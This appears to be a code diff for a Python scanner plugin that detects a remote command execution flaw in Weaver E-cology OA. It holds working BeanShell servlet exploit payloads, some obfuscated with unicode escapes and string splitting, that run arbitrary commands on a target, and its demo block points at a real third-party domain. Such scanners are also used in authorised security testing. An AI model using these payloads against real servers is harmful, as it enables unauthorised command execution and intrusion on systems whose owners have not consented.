@@ -1,7 +1,7 @@
 #/usr/bin/python3
 
-from app.lib.utils.request import request
-from app.lib.utils.common import get_capta, get_useragent
+from app.lib.request import request
+from app.lib.common import get_capta, get_useragent
 
 class Weaver_Ecology_Oa_Rce_BaseVerify:
     def __init__(self, url):
@@ -23,7 +23,7 @@ class Weaver_Ecology_Oa_Rce_BaseVerify:
         self.url_payloads = ["/bsh.servlet.BshServlet", "/weaver/bsh.servlet.BshServlet", "/weaveroa/bsh.servlet.BshServlet", "/oa/bsh.servlet.BshServlet"]
         self.data_payloads = ["""bsh.script=exec("{cmd}");&bsh.servlet.output=raw""", """bsh.script=\u0065\u0078\u0065\u0063("{cmd}");&bsh.servlet.captureOutErr=true&bsh.servlet.output=raw""", """bsh.script=eval%00("ex"%2b"ec(bsh.httpServletRequest.getParameter(\\"command\\"))");&bsh.servlet.captureOutErr=true&bsh.servlet.output=raw&command={cmd}"""]
        
-    def check(self):
+    async def check(self):
     
         """
         检测是否存在漏洞
@@ -37,15 +37,14 @@ class Weaver_Ecology_Oa_Rce_BaseVerify:
             url = self.url + url_payload
             for data_payload in self.data_payloads: 
                 try:
-                    check_req = request.post(url, data = data_payload.format(cmd = 'echo ' + self.capta), headers = self.headers)
-                    if check_req.status_code == 200 and ";</script>" not in check_req.content and "Login.jsp" not in check_req.content and "Error" not in check_req.content and self.capta in check_req.content:
-                        print("存在E-cologyOA_RCE漏洞")
+                    check_req = await request.post(url, data = data_payload.format(cmd = 'echo ' + self.capta), headers = self.headers)
+                    if check_req.status == 200 and ";</script>" not in check_req.content and "Login.jsp" not in check_req.content and "Error" not in check_req.content and self.capta in check_req.content:
+                        # print("存在E-cologyOA_RCE漏洞")
                         #print("Server Current Username：{0}".format(check_req.content))
                         return True, url_payload, data_payload
                 except Exception as e:
-                    print(e)
+                    # print(e)
                     pass
-        return False
 
 if __name__ == '__main__':
     Weaver_Ecology_OA_Rce = Weaver_Ecology_Oa_Rce_BaseVerify('https://www.baidu.com')
